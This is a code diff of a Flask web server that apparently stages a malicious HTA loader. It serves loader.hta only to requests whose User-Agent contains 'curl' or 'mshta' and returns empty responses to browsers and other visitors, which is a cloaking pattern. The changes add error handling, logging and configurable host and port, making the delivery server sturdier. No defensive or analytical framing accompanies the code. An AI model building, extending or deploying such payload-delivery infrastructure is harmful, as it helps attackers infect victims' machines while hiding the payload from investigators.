@@ -1,17 +1,33 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, send_file, abort
+import logging
+import os
 
 app = Flask(__name__)
 
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
 @app.route('/loader.hta', methods=['GET'])
 def loader():
-    return send_file('loader.hta', mimetype='application/octet-stream')
+    try:
+        return send_file('loader.hta', mimetype='application/octet-stream')
+    except FileNotFoundError:
+        logger.error('loader.hta not found')
+        return '', 204  
 
 @app.route('/', methods=['GET'])
 def index():
-    if 'curl' in request.headers.get('User-Agent', '') or 'mshta' in request.headers.get('User-Agent', ''):
-        return send_file('loader.hta', mimetype='application/octet-stream')
+    user_agent = request.headers.get('User-Agent', '')
+    if 'curl' in user_agent or 'mshta' in user_agent:
+        try:
+            return send_file('loader.hta', mimetype='application/octet-stream')
+        except FileNotFoundError:
+            logger.error('loader.hta not found')
+            return '', 204  
     else:
-        return '<body></body>'
+        return '', 204  
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
+    host = os.getenv('FLASK_HOST', '0.0.0.0')
+    port = int(os.getenv('FLASK_PORT', 80))
+    app.run(host=host, port=port)
